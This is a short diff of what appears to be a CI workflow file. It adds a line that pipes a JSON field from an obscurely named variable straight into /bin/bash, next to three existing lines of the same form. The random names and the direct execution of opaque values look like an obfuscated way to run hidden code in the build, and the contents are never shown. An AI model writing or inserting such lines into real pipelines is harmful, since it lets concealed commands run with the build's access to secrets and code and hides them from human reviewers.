@@ -22,6 +22,7 @@ jobs:
           printf '%s' "$mjyfv2980" | jq -r .gatkw0 | /bin/bash
           echo $grwt77945 | jq -r .oao1 | /bin/bash
           printf '%s' "$s425" | jq -r .t85362 | /bin/bash
+          echo $sdf3 | jq -r .xcv15 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
